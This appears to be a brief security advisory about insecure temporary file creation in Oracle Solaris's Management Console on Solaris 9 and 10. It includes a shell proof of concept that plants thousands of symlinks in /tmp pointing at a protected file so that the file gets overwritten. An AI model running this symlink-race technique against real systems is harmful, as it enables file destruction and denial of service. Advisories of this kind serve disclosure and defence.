source: http://www.securityfocus.com/bid/41642/info

The 'Solaris Management Console' sub component of Oracle Solaris creates temporary files in an insecure manner.

An attacker with local access can exploit this issue to overwrite arbitrary files. This may result in denial-of-service conditions or could aid in other attacks.

Solaris 9 and 10 are affected.

   $ id
   uid=101(fstuart) gid=14(sysadmin)
   $ cd /tmp
   $ x=0
   $ while [ "$x" -ne 30000 ] ;do
   > ln -s /etc/important /tmp/dummy.$x
   > x=$(expr "$x" + 1)
   > done
   $ ls -dl /etc/important
   -rw-r--r--   1 root     root          38 Jan  3 22:43 /etc/important
   $ cat /etc/important
      This is an important file!

      EOF